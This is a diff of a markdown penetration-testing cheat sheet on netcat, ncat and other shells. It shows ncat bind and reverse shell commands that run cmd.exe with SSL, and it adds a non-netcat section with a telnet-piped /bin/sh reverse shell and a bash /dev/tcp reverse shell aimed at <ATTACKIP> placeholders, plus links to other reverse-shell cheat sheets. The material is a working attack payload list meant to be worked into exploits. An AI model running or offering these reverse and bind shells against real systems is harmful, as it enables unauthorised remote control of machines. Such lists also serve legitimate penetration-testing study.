@@ -58,7 +58,7 @@ No matter what's different with each one, every single one is calling a command 
 
 Ncat and nc are great tools. You can do a ton with each one, but ncat is just a whole other level for what it allows you to accomplish. While nc is the traditional tool, ncat comes from the same people who produce nmap and includes tons more features including ssl support and the ability to restrict access! 
 
-To create a bind shell that only allows a specific IP to connect to it, use
+Of course, you'll have to work these into your exploit. To create a bind shell that only allows a specific IP to connect to it, use
 
 ~~~
 ncat -lvp 4445 -e cmd.exe --allow <ATTACKIP> --ssl
@@ -69,3 +69,35 @@ To do this even more safely, use a reverse shell
 ~~~
 ncat -v <attackIP> 443 -e cmd.exe --ssl
 ~~~
+
+
+### Non-netcat Shells
+
+This one is really clunky, but it works when you just can't get anything else working.
+
+~~~
+telnet <ATTACKIP> 443 | /bin/sh | telnet <ATTACKIP> 444
+~~~
+
+For this to work, you need two listeners and your shell will show up on the second one. It's a complete mess, but it works and it's just kind of nifty to see. 
+
+This one came from [this](https://twitter.com/webpentest/status/424165659518316544) tweet and it's interesting. 
+
+~~~
+/bin/bash -l > /dev/tcp/<ATTACKIP>/<ATTACKPORT> 0<&1 2>&1
+~~~
+
+
+
+
+
+#### Sources
+
+"If I've seen so far, it's because I've stolen the shoulders of giants" or something. 
+
+These are some great resources for some of the shells I've included above. Learn from others, modify it, and share!
+
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
